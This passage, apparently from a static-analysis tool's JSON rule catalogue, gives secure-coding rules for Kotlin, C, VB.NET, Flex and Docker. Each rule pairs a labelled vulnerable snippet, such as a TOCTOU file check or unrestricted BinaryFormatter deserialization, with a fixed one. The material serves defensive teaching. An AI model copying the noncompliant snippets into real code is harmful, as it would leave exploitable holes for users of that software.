javax.net.ssl.HttpsURLConnection\nimport javax.net.ssl.SSLSession\nimport javax.net.ssl.HostnameVerifier\nimport okhttp3.OkHttpClient\nimport okhttp3.Request\nimport okhttp3.Response\n\nfun request() {\n    val builder = OkHttpClient.Builder()\n\n    OkHttpClient client = builder.build()\n\n    Request request = new Request.Builder()\n            .url(\"https://example.com\")\n            .build()\n\n    Response response = client.newCall(request).execute()\n}\n</pre>\n<h3>How does this work?</h3>\n<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root\ncause: the validity of the certificate.</p>\n<h4>Use valid certificates</h4>\n<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around\nanother system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>\n<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,\nconsider replicating its service to a server whose certificate you can change yourself.</p>\n<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>\n<ul>\n  <li> Create a self-signed certificate for that machine. </li>\n  <li> Add this self-signed certificate to the system’s trust store. </li>\n  <li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li>\n</ul>\n<p>Here is a sample command to import a certificate to the Java trust store:</p>\n<pre>\nkeytool -import -alias myserver -file myserver.crt -keystore cacerts\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>\n  <li> <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li>\n  <li> <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">OWASP Top 10 2021 Category A7</a> - Identification and\n  Authentication Failures </li>\n  <li> <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec Verification\n  Standard</a> - Network Communication Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">OWASP Mobile Top 10 2016 Category M3</a> - Insecure\n  Communication </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/297\">MITRE, CWE-297</a> - Improper Validation of Certificate with Host Mismatch </li>\n  <li> <a\n  href=\"https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.+Do+not+use+insecure+or+weak+cryptographic+algorithms\">https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.+Do+not+use+insecure+or+weak+cryptographic+algorithms</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "kotlin:S6291": {
        "name": "Using unencrypted databases in mobile applications is security-sensitive",
        "htmlDesc": "<p>Storing data locally is a common task for mobile applications. Such data includes preferences or authentication tokens for external services, among\nother things. There are many convenient solutions that allow storing data persistently, for example SQLiteDatabase, SharedPreferences, and Realm. By\ndefault these systems store the data unencrypted, thus an attacker with physical access to the device can read them out easily. Access to sensitive\ndata can be harmful for the user of the application, for example when the device gets stolen.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The database contains sensitive data that could cause harm when leaked. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to password-encrypt local databases that contain sensitive information. Most systems provide secure alternatives to plain-text\nstorage that should be used. If no secure alternative is available the data can also be encrypted manually before it is stored.</p>\n<p>The encryption password should not be hard-coded in the application. There are different approaches how the password can be provided to encrypt and\ndecrypt the database. In the case of <code>EncryptedSharedPreferences</code> the Android Keystore can be used to store the password. Other databases\ncan rely on <code>EncryptedSharedPreferences</code> to store passwords. The password can also be provided dynamically by the user of the application\nor it can be fetched from a remote server if the other methods are not feasible.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://developer.android.com/reference/kotlin/android/database/sqlite/SQLiteDatabase\">SQLiteDatabase</a>:</p>\n<pre>\nvar db = activity.openOrCreateDatabase(\"test.db\", Context.MODE_PRIVATE, null) // Sensitive\n</pre>\n<p>For <a href=\"https://developer.android.com/training/data-storage/shared-preferences\">SharedPreferences</a>:</p>\n<pre>\nval pref = activity.getPreferences(Context.MODE_PRIVATE) // Sensitive\n</pre>\n<p>For <a href=\"https://docs.mongodb.com/realm/\">Realm</a>:</p>\n<pre>\nval config = RealmConfiguration.Builder().build()\nval realm = Realm.getInstance(config) // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Instead of SQLiteDatabase you can use <a href=\"https://www.zetetic.net/sqlcipher/sqlcipher-for-android/\">SQLCipher</a>:</p>\n<pre>\nval db = SQLiteDatabase.openOrCreateDatabase(\"test.db\", getKey(), null)\n</pre>\n<p>Instead of SharedPreferences you can use <a\nhref=\"https://developer.android.com/reference/androidx/security/crypto/EncryptedSharedPreferences\">EncryptedSharedPreferences</a>:</p>\n<pre>\nval masterKeyAlias = MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC)\nEncryptedSharedPreferences.create(\n    \"secret\",\n    masterKeyAlias,\n    context,\n    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,\n    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM\n)\n</pre>\n<p>For Realm an encryption key can be specified in the config:</p>\n<pre>\nval config = RealmConfiguration.Builder()\n    .encryptionKey(getKey())\n    .build()\nval realm = Realm.getInstance(config)\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>\n  <li> <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">OWASP Top 10 2021 Category A4</a> - Insecure Design </li>\n  <li> <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements\">Mobile AppSec\n  Verification Standard</a> - Data Storage and Privacy Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage\">OWASP Mobile Top 10 2016 Category M2</a> - Insecure\n  Data Storage </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/311\">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li>\n</ul>",
        "severity": "MAJOR"
      },
      "kotlin:S6293": {
        "name": "Using biometric authentication without a cryptographic solution is security-sensitive",
        "htmlDesc": "<p>Android comes with Android KeyStore, a secure container for storing key materials. It’s possible to define certain keys to be unlocked when users\nauthenticate using biometric credentials. This way, even if the application process is compromised, the attacker cannot access keys, as presence of\nthe authorized user is required.</p>\n<p>These keys can be used, to encrypt, sign or create a message authentication code (MAC) as proof that the authentication result has not been\ntampered with. This protection defeats the scenario where an attacker with physical access to the device would try to hook into the application\nprocess and call the <code>onAuthenticationSucceeded</code> method directly. Therefore he would be unable to extract the sensitive data or to perform\nthe critical operations protected by the biometric authentication.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The application contains:</p>\n<ul>\n  <li> Cryptographic keys / sensitive information that need to be protected using biometric authentication. </li>\n</ul>\n<p>There is a risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to tie the biometric authentication to a cryptographic operation by using a <code>CryptoObject</code> during authentication.</p>\n<h2>Sensitive Code Example</h2>\n<p>A <code>CryptoObject</code>is not used during authentication:</p>\n<pre>\n// ...\nval biometricPrompt: BiometricPrompt = BiometricPrompt(activity, executor, callback)\n// ...\nbiometricPrompt.authenticate(promptInfo) // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<p>A <code>CryptoObject</code> is used during authentication:</p>\n<pre>\n// ...\nval biometricPrompt: BiometricPrompt = BiometricPrompt(activity, executor, callback)\n// ...\nbiometricPrompt.authenticate(promptInfo, BiometricPrompt.CryptoObject(cipher)) // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">OWASP Top 10 2021 Category A7</a> - Identification and\n  Authentication Failures </li>\n  <li> <a href=\"https://developer.android.com/training/sign-in/biometric-auth\">developer.android.com</a> - Use a cryptographic solution that depends\n  on authentication </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m4-insecure-authentication\">OWASP Mobile Top 10 Category M4</a> - Insecure\n  Authentication </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x09-v4-authentication_and_session_management_requirements\">OWASP\n  MASVS</a> - Authentication and Session Management Requirements </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/287\">MITRE, CWE-287</a> - Improper Authentication </li>\n</ul>",
        "severity": "MAJOR"
      },
      "c:S5847": {
        "name": "Accessing files should not introduce TOCTOU vulnerabilities",
        "htmlDesc": "<p>When an application manipulates files, \"Time-Of-Check to Time-Of-Use\" can occur when a file-checking operation is disconnected from the actual\noperation it is bound to.</p>\n<p>For example, such a vulnerability occurs when a file existence check is performed strictly before a file creation operation.</p>\n<h2>Why is this an issue?</h2>\n<p>Race conditions can happen when file operations and their associated pre-checks are disconnected. Indeed, while the application assumes that the\nchecked file property will not change before performing the operation, there is a chance that changes are applied to the file.</p>\n<p>Especially, a concurrent process, which an attacker can control, could modify a file right after a check is performed and before the actual use.\nThis file can be deleted, created, altered, or see its permissions changed depending on the use case.</p>\n<h3>What is the potential impact?</h3>\n<p>The impact of a successfully exploited race condition is dependent on the business logic of the vulnerable application. The consequences will vary\ndepending on what check is performed and how the file is used.</p>\n<p>In general, attackers use such attacks to escalate privileges, execute arbitrary code, or perform a denial of service.</p>\n<h4>Arbitrary code execution</h4>\n<p>Executable or script file integrity and authenticity checks can be bypassed when exploiting a TOCTOU vulnerability. In such a scenario, attackers\nwould change an executable file content between when its integrity is checked and when the application executes it.</p>\n<p>This attack would allow attackers to trick the application into executing malicious, arbitrary code. They would then be granted the same privilege\nlevels as the application itself, which can be particularly severe when it runs with administration privileges.</p>\n<h4>Privileges escalation</h4>\n<p>When the attacker is a local user on the same server as the running application, the same attack is possible with extended probability. In such a\ncase, attackers can exploit the reading and writing to configuration files, the creation of local network resources, or the use of temporary files to\nachieve the same code execution purpose.</p>\n<p>However, in that case, the attack is only meaningful when the application is running with high or otherwise interesting privileges. Attackers\nexploiting a TOCTOU vulnerability that way would achieve horizontal or vertical privilege escalation.</p>\n<h4>Denial of service</h4>\n<p>When the application expects some file properties to be set at the operation time, it will often face unexpected errors when those properties have\nactually changed. This might be the case when writing to a file where newly set permissions forbid that operation or when reading from a deleted\nfile.</p>\n<p>When such errors are faced, the application might unexpectedly stop, which can affect its availability. Depending on the application and hosting\narchitectures, the interruption can be temporary or permanent, partial or complete.</p>\n<h2>How to fix it</h2>\n<p>To prevent TOCTOU race condition issues, best practices recommend relying on file operations that can perform the necessary preliminary checks\natomically. For example, file opening functions usually accept a parameter to check the file exists and return an error depending on the result. This\ncheck is atomic and is not susceptible to race conditions.</p>\n<p>When this is not possible, it might be possible to open a file directly, and to keep a reference to it for later use. If the conditions are set for\nthe subsequent operations, the application can continue with its processing and use the open file pointer to read or write to the file. In the\nopposite case, an error might be raised that will need to be properly handled.</p>\n<p>To finish, for most complex operations, the application can create a dedicated working directory and set tight permissions on it. This needs to be\nperformed atomically to prevent further race conditions. All subsequent sensitive file operations can then be performed in this dedicated\ndirectory.</p>\n<p>Note that this last solution is imperfect and is still susceptible to race condition attacks from privileged users and the application itself. It\nshould be used when no other countermeasure is acceptable.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>The following code sample is susceptible to a race condition attack because it checks a file exists strictly before it opens it for writing.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nFILE *fopen_if_not_exists(const char *file) {\n  if (access(file, F_OK) == -1 &amp;&amp; errno == ENOENT) {\n    FILE *f = fopen(file, \"w\"); // Noncompliant\n\n    return f;\n  }\n\n  return nullptr;\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nFILE *fopen_if_not_exists(const char *file) {\n  FILE *f = fopen(file, \"wx\");\n  return f;\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Here, the compliant code example uses an atomic operation to open the file and check for its existence beforehand.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Carnegie Mellon University Software Engineering Institure - <a\n  href=\"https://wiki.sei.cmu.edu/confluence/display/c/FIO45-C.+Avoid+TOCTOU+race+conditions+while+accessing+files\">FIO45-C. - Avoid TOCTOU race\n  conditions while accessing files</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/367\">CWE-367 - Time-of-check Time-of-use (TOCTOU) Race Condition</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "vbnet:S5773": {
        "name": "Types allowed to be deserialized should be restricted",
        "htmlDesc": "<p>Deserialization is the process of converting serialized data (such as objects or data structures) back into their original form. Types allowed to\nbe unserialized should be strictly controlled.</p>\n<h2>Why is this an issue?</h2>\n<p>During the deserialization process, the state of an object will be reconstructed from the serialized data stream. By allowing unrestricted\ndeserialization of types, the application makes it possible for attackers to use types with dangerous or otherwise sensitive behavior during the\ndeserialization process.</p>\n<h3>What is the potential impact?</h3>\n<p>When an application deserializes untrusted data without proper restrictions, an attacker can craft malicious serialized objects. Depending on the\naffected objects and properties, the consequences can vary.</p>\n<h3>Remote Code Execution</h3>\n<p>If attackers can craft malicious serialized objects that contain executable code, this code will run within the application’s context, potentially\ngaining full control over the system. This can lead to unauthorized access, data breaches, or even complete system compromise.</p>\n<p>For example, a well-known attack vector consists in serializing an object of type <code><a\nhref=\"https://docs.microsoft.com/en-us/dotnet/api/system.codedom.compiler.tempfilecollection.-ctor?view=netframework-4.8#System_CodeDom_Compiler_TempFileCollection__ctor\">TempFileCollection</a></code>\nwith arbitrary files (defined by an attacker) which will be deleted on the application deserializing this object (when the <a\nhref=\"https://docs.microsoft.com/en-us/dotnet/api/system.codedom.compiler.tempfilecollection.finalize?view=netframework-4.8\">finalize()</a> method of\nthe TempFileCollection object is called). These kinds of specially crafted serialized objects are called \"<a\nhref=\"https://github.com/pwntester/ysoserial.net\">gadgets</a>\".</p>\n<h3>Privilege escalation</h3>\n<p>Unrestricted deserialization can also enable attackers to escalate their privileges within the application. By manipulating the serialized data, an\nattacker can modify object properties or bypass security checks, granting them elevated privileges that they should not have. This can result in\nunauthorized access to sensitive data, unauthorized actions, or even administrative control over the application.</p>\n<h3>Denial of Service</h3>\n<p>In some cases, an attacker can abuse the deserialization process to cause a denial of service (DoS) condition. By providing specially crafted\nserialized data, the attacker can trigger excessive resource consumption, leading to system instability or unresponsiveness. This can disrupt the\navailability of the application, impacting its functionality and causing inconvenience to users.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>With <a\nhref=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter\"><code>BinaryFormatter</code></a>,\n<a\nhref=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer\"><code>NetDataContractSerializer</code></a>\nor <a\nhref=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter\"><code>SoapFormatter</code></a>:</p>\n<pre data-diff-id=\"201\" data-diff-type=\"noncompliant\">\nDim myBinaryFormatter = New BinaryFormatter()\nmyBinaryFormatter.Deserialize(stream) ' Noncompliant\n</pre>\n<p>With <a\nhref=\"https://learn.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer\"><code>JavaScriptSerializer</code></a>:</p>\n<pre data-diff-id=\"202\" data-diff-type=\"noncompliant\">\nDim serializer1 As JavaScriptSerializer = New JavaScriptSerializer(New SimpleTypeResolver()) ' Noncompliant: SimpleTypeResolver is insecure (every type is resolved)\nserializer1.Deserialize(Of ExpectedType)(json)\n</pre>\n<h4>Compliant solution</h4>\n<p>With <a\nhref=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter\"><code>BinaryFormatter</code></a>,\n<a\nhref=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer\"><code>NetDataContractSerializer</code></a>\nor <a\nhref=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter\"><code>SoapFormatter</code></a>:</p>\n<pre data-diff-id=\"201\" data-diff-type=\"compliant\">\nNotInheritable Class CustomBinder\n    Inherits SerializationBinder\n    Public Overrides Function BindToType(assemblyName As String, typeName As String) As Type\n        If Not (Equals(typeName, \"type1\") OrElse Equals(typeName, \"type2\") OrElse Equals(typeName, \"type3\")) Then\n            Throw New SerializationException(\"Only type1, type2 and type3 are allowed\")\n        End If\n        Return Assembly.Load(assemblyName).[GetType](typeName)\n    End Function\nEnd Class\n\nDim myBinaryFormatter = New BinaryFormatter()\nmyBinaryFormatter.Binder = New CustomBinder()\nmyBinaryFormatter.Deserialize(stream)\n</pre>\n<p>With <a\nhref=\"https://learn.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer\"><code>JavaScriptSerializer</code></a>:</p>\n<pre data-diff-id=\"202\" data-diff-type=\"compliant\">\nPublic Class CustomSafeTypeResolver\n    Inherits JavaScriptTypeResolver\n    Public Overrides Function ResolveType(id As String) As Type\n        If Not Equals(id, \"ExpectedType\") Then\n            Throw New ArgumentNullException(\"Only ExpectedType is allowed during deserialization\")\n        End If\n        Return Type.[GetType](id)\n    End Function\nEnd Class\n\nDim serializer As JavaScriptSerializer = New JavaScriptSerializer(New CustomSafeTypeResolver())\nserializer.Deserialize(Of ExpectedType)(json)\n</pre>\n<h3>Going the extra mile</h3>\n<p>Instead of using <a\nhref=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter\"><code>BinaryFormatter</code></a>\nand similar serializers, it is recommended to use safer alternatives in most of the cases, such as <a\nhref=\"https://learn.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer\"><code>XmlSerializer</code></a> or <a\nhref=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.datacontractserializer\"><code>DataContractSerializer</code></a>.</p>\n<p>If it’s not possible then try to mitigate the risk by restricting the types allowed to be deserialized:</p>\n<ul>\n  <li> by implementing an \"allow-list\" of types, but keep in mind that novel dangerous types are regularly discovered and this protection could be\n  insufficient over time. </li>\n  <li> or/and implementing a tamper protection, such as <a href=\"https://en.wikipedia.org/wiki/HMAC\">message authentication codes</a> (MAC). This way\n  only objects serialized with the correct MAC hash will be deserialized. </li>\n</ul>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Microsoft Learn - <a\n  href=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.binary.binaryformatter\">BinaryFormatter Class</a> </li>\n  <li> Microsoft Learn - <a\n  href=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.netdatacontractserializer\">NetDataContractSerializer Class</a> </li>\n  <li> Microsoft Learn - <a\n  href=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.formatters.soap.soapformatter\">SoapFormatter Class</a> </li>\n  <li> Microsoft Learn - <a\n  href=\"https://learn.microsoft.com/en-us/dotnet/api/system.web.script.serialization.javascriptserializer\">JavaScriptSerializer Class</a> </li>\n  <li> Microsoft Learn - <a href=\"https://learn.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer\">XmlSerializer Class</a> </li>\n  <li> Microsoft Learn - <a\n  href=\"https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.datacontractserializer\">DataContractSerializer Class</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Microsoft Learn - <a href=\"https://docs.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide?s=03\">Deserialization\n  risks in use of BinaryFormatter and related types</a> </li>\n  <li> OWASP - <a href=\"https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Deserialization_Cheat_Sheet.md\">Deserialization Cheat\n  Sheet</a> </li>\n  <li> Wikipedia - <a href=\"https://en.wikipedia.org/wiki/HMAC\">Message Authentication Codes (MAC)</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization\">Top 10 2017 Category A8 - Insecure\n  Deserialization</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/134\">CWE-134 - Use of Externally-Controlled Format String</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/502\">CWE-502 - Deserialization of Untrusted Data</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "flex:S1465": {
        "name": "\"LocalConnection\" should be configured to narrowly specify the domains with which local connections to other Flex application are allowed",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>A <code>LocalConnection</code> object is used to invoke a method in another <code>LocalConnection</code> object, either within a single SWF file or\nbetween multiple SWF files. This kind of local connection should be authorized only when the origin (domain) of the other Flex applications is\nperfectly defined.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nlocalConnection.allowDomain(\"*\");\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nlocalConnection.allowDomain(\"www.myDomain.com\");\n</pre>",
        "severity": "CRITICAL"
      },
      "flex:S1466": {
        "name": "The flash.system.Security.exactSettings property should never be set to false",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>The Security.exactSettings value should remain set at the default value of true. Setting this value to false could make the SWF vulnerable to\ncross-domain attacks.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nSecurity.exactSettings = false;\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nSecurity.exactSettings = true;\n</pre>",
        "severity": "BLOCKER"
      },
      "flex:S1468": {
        "name": "Security.allowDomain(...) should only be used in a tightly focused manner",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Calling Security.allowDomain(\"*\") lets any domain cross-script into the domain of this SWF and exercise its functionality.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nSecurity.allowDomain(\"*\");\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nSecurity.allowDomain(\"www.myDomain.com\");\n</pre>",
        "severity": "BLOCKER"
      },
      "flex:S1951": {
        "name": "The \"trace\" function should not be used",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=flex%3AS4507'>S4507</a> instead.</p>\n<h2>Why is this an issue?</h2>\n<p>The <code>trace()</code> function outputs debug statements, which can be read by anyone with a debug version of the Flash player. Because sensitive\ninformation could easily be exposed in this manner, <code>trace()</code> should never appear in production code.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n    var val:Number = doCalculation();\n    trace(\"Calculation result: \" + val);  // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n    var val:Number = doCalculation();\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/489\">MITRE, CWE-489</a> - Active Debug Code </li>\n</ul>",
        "severity": "MINOR"
      },
      "flex:S4507": {
        "name": "Delivering code in production with debug features activated is security-sensitive",
        "htmlDesc": "<p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during\ndevelopment, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information\nabout the system, like the application’s path or file names.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>\n  <li> The application runs by default with debug features activated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Do not enable debugging features on production servers or applications distributed to end users.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nif (unexpectedCondition)\n{\n  Alert.show(\"Unexpected Condition\"); // Sensitive\n}\n</pre>\n<p>The <code>trace()</code> function outputs debug statements, which can be read by anyone with a debug version of the Flash player:</p>\n<pre>\nvar val:Number = doCalculation();\ntrace(\"Calculation result: \" + val);  // Sensitive\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li>\n  <li> <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/489\">MITRE, CWE-489</a> - Active Debug Code </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/215\">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li>\n</ul>",
        "severity": "MINOR"
      },
      "flex:S1442": {
        "name": "\"Alert.show(...)\" should not be used",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=flex%3AS4507'>S4507</a> instead.</p>\n<h2>Why is this an issue?</h2>\n<p><code>Alert.show(...)</code> can be useful for debugging during development, but in production mode this kind of pop-up could expose sensitive\ninformation to attackers, and should never be displayed.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nif (unexpectedCondition)\n{\n  Alert.show(\"Unexpected Condition\");\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/489\">MITRE, CWE-489</a> - Active Debug Code </li>\n</ul>",
        "severity": "MINOR"
      },
      "docker:S6500": {
        "name": "Automatically installing recommended packages is security-sensitive",
        "htmlDesc": "<p>Installing recommended packages automatically can lead to vulnerabilities in the Docker image.</p>\n<p>Potentially unnecessary packages are installed via a known Debian package manager. These packages will increase the attack surface of the created\ncontainer as they might contain unidentified vulnerabilities or malicious code. Those packages could be used as part of a broader supply chain attack.\nIn general, the more packages are installed in a container, the weaker its security posture is.<br> Depending on the introduced vulnerabilities, a\nmalicious actor accessing such a container could use these for privilege escalation.<br> Removing unused packages can also significantly reduce your\nDocker image size.</p>\n<p>To be secure, remove unused packages where possible and ensure images are subject to routine vulnerability scans.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Container vulnerability scans are not performed. </li>\n</ul>\n<p>There is a risk if you answered yes to the question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Avoid installing package dependencies that are not strictly required. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nFROM ubuntu:22.04\n\n# Sensitive\nRUN apt install -y build-essential\n\n# Sensitive\nRUN apt-get install -y build-essential\n\n# Sensitive\nRUN aptitude install -y build-essential\n</pre>\n<h2>Compliant Solution</h2>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nFROM ubuntu:22.04\n\nRUN apt --no-install-recommends install -y build-essential\n\nRUN apt-get --no-install-recommends install -y build-essential\n\nRUN aptitude --without-recommends install -y build-essential\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.debian.org/doc/debian-policy/ch-relationships.html\">Debian Documentation</a> - Binary Dependencies </li>\n  <li> <a href=\"https://ubuntu.com/blog/we-reduced-our-docker-images-by-60-with-no-install-recommends\">Ubuntu Blog</a> - Container size reduction\n  </li>\n</ul>",
        "severity": "MINOR"
      },
      "scala:S1313": {
        "name": "Using hardcoded IP addresses is security-sensitive",
